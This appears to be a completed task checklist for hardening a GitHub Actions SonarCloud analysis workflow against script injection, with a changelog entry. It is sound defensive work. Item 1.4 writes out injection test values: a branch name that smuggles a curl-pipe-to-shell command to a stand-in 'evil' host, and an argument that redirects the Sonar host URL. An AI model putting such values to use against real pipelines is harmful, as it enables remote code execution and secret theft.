# Tasks

## 1. Harden the Sonar workflow

- [x] 1.1 Move all `${{ }}` expressions out of the release-event "Run analysis" step into step `env:` and quoted shell vars; verify `grep -n '\${{' ` shows none inside that `run:` block.
- [x] 1.2 Rewrite the non-release "Run analysis" step: env-only inputs, `scope` bash array, quoted `"${scope[@]}"`; verify no `${{` remains in its `run:` and `$SCOPE_OPTIONS` is gone.
- [x] 1.3 Harden "Store project information" `$GITHUB_OUTPUT` writes (jq -r into vars, `printf`, newline rejection); verify with a local run using a multi-line version value that extra keys are not written.
- [x] 1.4 Verify with `actionlint` and `shellcheck` on the extracted run blocks, and a local dry run of the array logic with branch `a";curl${IFS}evil|sh;"` and `x -Dsonar.host.url=https://evil` showing each is a single argument.

## 2. Changelog

- [x] 2.1 Add `- [#PR](URL) \[tooling] code-npm_node-sonarcloud-analysis.yml: pass untrusted context via env instead of interpolating into run` to `code/CHANGELOG.md` `[Unreleased]` per the changelog skill; verify format matches the #249 line.
